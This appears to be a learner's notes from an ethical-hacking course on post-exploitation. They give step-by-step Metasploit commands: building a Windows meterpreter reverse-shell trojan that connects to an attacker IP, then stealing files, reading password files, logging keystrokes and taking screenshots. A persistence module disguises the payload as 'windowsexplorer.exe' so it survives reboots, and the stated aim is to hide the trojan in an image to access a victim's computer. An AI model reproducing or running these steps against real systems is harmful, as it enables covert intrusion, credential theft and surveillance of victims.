**Post Exploitation** 

How to create a trojan and then hide it in an image so that we can access a victim's computer. 

Making the trojan with MSFVenom:
```sh
sudo msfvenom -p windows/meterpreter/reverse_tcp --platform windows -f exe LHOST=<attacker-ip> LPORT=4444 -o /home/payloads/payload.exe
```
- If you wanted to use this on an external network you would add an external IP (public IP) and then setup port forwarding. in your router. 

---

**File control in meterpreter**

Upload file
```sh
upload example.png
```

Delete file
```sh
del example.png
```

Download file from victim's PC
```sh
download stolen-file.txt
```

Read sensitive files
```sh
cat passwords.txt
```

**Other meterpreter commands**

Drop into a normal shell
```sh
shell
```

Capture keyboard 
```sh
keyscan_start
```

Dump data from keyscan
```sh
keyscan_dump
```

Take screenshot
```sh
screenshot
```

---

**Create a More Sustainable Session**

Background the meterpreter session
```sh
background
```

Restore session
```sh
sessions <id>
```

After we background the session we can use a persistence module
```sh
use exploit/windows/local/persitence
```
- May need to set payload before this step 

Set options
```sh
options
```

```sh
set EXE_NAME windowsexplorer.exe
```

Set which session to use
```sh
set SESSION 1
```

Show advanced settings 
```sh
show advanced
```

Set custom exe
```sh
set EXE::Custom /<path-to-file>
```
- Here i would use: `/var/www/html/payloads/payload.exe`

Run the exploit
```sh
exploit
```

If we go back into the muli-handler and restart the computer, the listener should get a session back if the victim's PC is restarted.

It could take a few minutes for it to work. There is a way to hide our malicious process but i'll have to add in this later when i get on Kali and experiment with the course content.

---

**Ethical Hacker's Blueprint - Road to Success**
















